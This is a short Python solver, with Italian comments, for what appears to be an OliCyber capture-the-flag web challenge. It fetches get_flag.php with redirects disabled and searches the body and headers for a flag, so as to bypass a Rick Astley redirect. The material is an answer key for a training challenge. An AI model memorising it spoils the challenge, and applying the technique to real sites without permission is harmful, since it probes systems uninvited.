# Mi hanno mandato questo link ma vengo continuamente reindirizzato ad uno strano video. Sai dirmi come mai?

import requests
import re
from bs4 import BeautifulSoup

url = "http://roller.challs.olicyber.it"

# praticamente quando clicchi su "VINCI" vieni reindirizzato a un video di Rick Astley
# ma se analizzi la risposta di get_flag.php senza seguire i redirect...

flagurl = url + "/get_flag.php"
flagresponse = requests.get(flagurl, allow_redirects=False)
print("\nresponse get_flag.php:")
print("\nstatus:", flagresponse.status_code)
print("\nheaders:", flagresponse.headers)
print("\ncontent:", flagresponse.text)

flagmatch = re.search(r'flag\{[^}]+\}', flagresponse.text, re.IGNORECASE)
if flagmatch:
    print("\nFlag (corpo):", flagmatch.group(0))
else:
    for header, value in flagresponse.headers.items():
        flagmatch = re.search(r'flag\{[^}]+\}', value, re.IGNORECASE)
        if flagmatch:
            print(f"\nFlag (header {header}):", flagmatch.group(0))
            break
    else:
        print("Nessuna flag trovata nella risposta di get_flag.php")

